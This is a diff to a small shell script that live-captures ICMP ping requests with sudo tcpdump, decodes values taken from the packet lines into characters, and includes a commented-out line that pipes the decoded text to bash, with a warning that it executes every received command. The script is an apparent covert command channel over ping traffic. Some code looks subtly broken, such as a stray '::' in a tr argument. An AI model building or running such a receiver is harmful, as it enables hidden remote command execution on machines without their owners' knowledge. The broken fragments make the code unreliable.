@@ -1,6 +1,12 @@
-x=`cat tcpdump.txt | grep echo | grep length | grep request | cut -d'h' -f2- | cut -d'h' -f2- | tr -d ' '`
+x=`sudo timeout 5s tcpdump -l | grep --line-buffered echo | grep --line-buffered request | stdbuf -oL cut -d'h' -f2- | stdbuf -oL cut -d'h' -f2- | stdbuf -oL tr -d ' '::`
 
 echo "Decimal: " $x
 
-printf "$(printf '\\%03o' $x)"; echo
+echo "$(printf '\\%03o' $x)"; echo
 
+y="$(printf '\\%03o' $x)"; echo
+
+#This function will execute every send command! 
+#Only use if needed!
+
+# echo "$y" | bash 
